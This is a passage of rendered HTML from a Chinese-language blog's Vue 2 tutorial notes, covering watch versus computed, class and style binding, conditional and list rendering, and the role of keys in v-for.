class="comment">//vm.$watch(&quot;firstName&quot;,function(newValue,oldValue)&#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//console.log(newValue,oldValue)</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//&#125;)</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="watch和computed对比"><a href="#watch和computed对比" class="headerlink" title="watch和computed对比"></a>watch和computed对比</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">computed和watch之间的区别：</span></span><br><span class="line"><span class="comment">1.computedi能完成的功能，watch都可以完成。</span></span><br><span class="line"><span class="comment">2.watch能完成的功能，computed.不一定能完成，例如：watch可以进行异步(定时器的回调函数、ajax的回调函数、Promise的回调函数等)操作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">两个重要的小原则：</span></span><br><span class="line"><span class="comment">1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象。</span></span><br><span class="line"><span class="comment">2.所有不被Vue所管理的函数(定时器的回调函数、ajax的回调函数、Promise的回调函数等)，最好写成箭头函数，这样this的指向才是vm或组件实例对象。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                firstName:<span class="string">&quot;陈小胖&quot;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        watch:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">firstName</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 延时3秒后执行</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(newValue,oldValue)</span></span><br><span class="line">                &#125;,3000) </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        computed:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">fullName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 错误写法，computed中只能写返回值，写不了异步</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> <span class="built_in">this</span>.firstName</span></span><br><span class="line">                &#125;,3000)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="绑定样式"><a href="#绑定样式" class="headerlink" title="绑定样式"></a>绑定样式</h1><h3 id="class样式"><a href="#class样式" class="headerlink" title=":class样式"></a>:class样式</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">c1ass样式</span></span><br><span class="line"><span class="comment">写法：</span></span><br><span class="line"><span class="comment">c1ass=&quot;xxx&quot;</span></span><br><span class="line"><span class="comment">xxx可以是字符串、对象、数组。</span></span><br><span class="line"><span class="comment">字符串写法适用于：类名不确定，要动态获取。</span></span><br><span class="line"><span class="comment">对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。</span></span><br><span class="line"><span class="comment">数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 绑定c1ass样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;mood&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;firstName&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 绑定c1ass样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;firstName&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 绑定c1ss样式-对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;firstName&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                firstName:<span class="string">&quot;陈小胖&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 字符串</span></span></span><br><span class="line"><span class="javascript">                mood:<span class="string">&quot;class1&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 数组</span></span></span><br><span class="line"><span class="javascript">                classArr:[<span class="string">&quot;class1&quot;</span>,<span class="string">&quot;class2&quot;</span>,<span class="string">&quot;class3&quot;</span>],</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 对象</span></span></span><br><span class="line">                classObj:&#123;</span><br><span class="line"><span class="javascript">                    class1:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">                    class2:<span class="literal">false</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="style样式"><a href="#style样式" class="headerlink" title=":style样式"></a>:style样式</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">sty1e样式</span></span><br><span class="line"><span class="comment">:style=&quot;&#123;fontsize:xxx&#125;其中xxx是动态值。</span></span><br><span class="line"><span class="comment">:style=&quot;[styleObj1,styleObj2]&quot;，其中styleObj1和styleObj2是对象</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">style</span>=<span class="string">&quot;backgroundColor: blue;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;backgroundColor: style + &#x27;px&#x27;; &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;styleObj&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;[styleObj,styleObj2]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                style:<span class="string">&quot;bule&quot;</span>,</span></span><br><span class="line">                styleObj:&#123;</span><br><span class="line"><span class="javascript">                    fontSize:<span class="string">&quot;30px&quot;</span>,</span></span><br><span class="line"><span class="javascript">                    color:<span class="string">&quot;bule&quot;</span></span></span><br><span class="line">                &#125;,</span><br><span class="line">                styleObj2:&#123;</span><br><span class="line"><span class="javascript">                    fontSize:<span class="string">&quot;30px&quot;</span>,</span></span><br><span class="line"><span class="javascript">                    color:<span class="string">&quot;bule&quot;</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h1><h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">写法：</span></span><br><span class="line"><span class="comment">(1).v-if=&quot;表达式&quot;</span></span><br><span class="line"><span class="comment">(2).v-else-if=&quot;表达式&quot;</span></span><br><span class="line"><span class="comment">(3).v-else=&quot;表达式&quot;</span></span><br><span class="line"><span class="comment">适用于：切换频率较低的场景。</span></span><br><span class="line"><span class="comment">特点：不展示的DOM元素直接被移除。</span></span><br><span class="line"><span class="comment">注意：v-if可以和：v-else-if、v-else一起使用，但要求结构不能被“打断”。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 假如 n=3 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;n === 1&quot;</span>&gt;</span>if1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;n === 3&quot;</span>&gt;</span>if2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span>if3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- v-if可以配合template的使用,template不影响结构，一执行这段代码，template元素就消失了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;n === 3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">写法：</span></span><br><span class="line"><span class="comment">V-show=&quot;表达式&quot;</span></span><br><span class="line"><span class="comment">适用于：切换频率较高的场景。</span></span><br><span class="line"><span class="comment">特点：不展示的D0M元素未被移除，仅仅是使用样式隐藏掉(相当于是display=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 假如 n=3 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">&quot;n === 3&quot;</span>&gt;</span>show1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h1><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">v-for指令：</span></span><br><span class="line"><span class="comment">1.用于展示列表数据</span></span><br><span class="line"><span class="comment">2.语法：v-for=&quot;(item,index) in/of xxx&quot; :key=&quot;yyy&quot;</span></span><br><span class="line"><span class="comment">3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 指定次数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- item:1 2 3 4 5 index: 0 1 2 3 4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) in 5&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;item&#125;&#125;-&#123;&#123;index&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="key作用与原理"><a href="#key作用与原理" class="headerlink" title="key作用与原理"></a>key作用与原理</h3><h5 id="index"><a href="#index" class="headerlink" title="index"></a>index</h5><p><img src="image-20220418193308205.png" alt=""></p><h5 id="id"><a href="#id" class="headerlink" title="id"></a>id</h5><p><img src="image-20220418193936012.png" alt=""></p><h5 id="key实例"><a href="#key实例" class="headerlink" title="key实例"></a>key实例</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>key的原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">面试题：react、vue中的key有什么作用？（key的内部原理）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1. 虚拟DOM中key的作用：</span></span><br><span class="line"><span class="comment">key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, </span></span><br><span class="line"><span class="comment">随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.对比规则：</span></span><br><span class="line"><span class="comment">(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：</span></span><br><span class="line"><span class="comment">①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！</span></span><br><span class="line"><span class="comment">②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">(2).旧虚拟DOM中未找到与新虚拟DOM相同的key</span></span><br><span class="line"><span class="comment">创建新的真实DOM，随后渲染到到页面。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3. 用index作为key可能会引发的问题：</span></span><br><span class="line"><span class="comment">(1). 若对数据进行：逆序添加、逆序删除等破坏顺序操作:</span></span><br><span class="line"><span class="comment">会产生没有必要的真实DOM更新 ==&gt; 界面效果没问题, 但效率低。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">(2). 如果结构中还包含输入类的DOM：</span></span><br><span class="line"><span class="comment">会产生错误DOM更新 ==&gt; 界面有问题。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4. 开发中如何选择key?:</span></span><br><span class="line"><span class="comment">(1).最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。</span></span><br><span class="line"><span class="comment">(2).如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，</span></span><br><span class="line"><span class="comment">使用index作为key是没有问题的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5.v-for中不写key,Vue则默认将index作为key的值</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 遍历数组 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表（遍历数组）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;add&quot;</span>&gt;</span>添加一个老刘<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) of persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">                    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">            Vue.config.productionTip = <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">                data:&#123;</span><br><span class="line">                    persons:[</span><br><span class="line"><span class="javascript">                        &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="javascript">                        &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;,</span></span><br><span class="line"><span class="javascript">                        &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>&#125;</span></span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                methods: &#123;</span><br><span class="line"><span class="javascript">                    <span class="function"><span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">const</span> p = &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;老刘&#x27;</span>,<span class="attr">age</span>:<span class="number">40</span>&#125;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">this</span>.persons.unshift(p)</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220418195308986.png" alt=""></p><h3 id="列表过滤"><a href="#列表过滤" class="headerlink" title="列表过滤"></a>列表过滤</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span 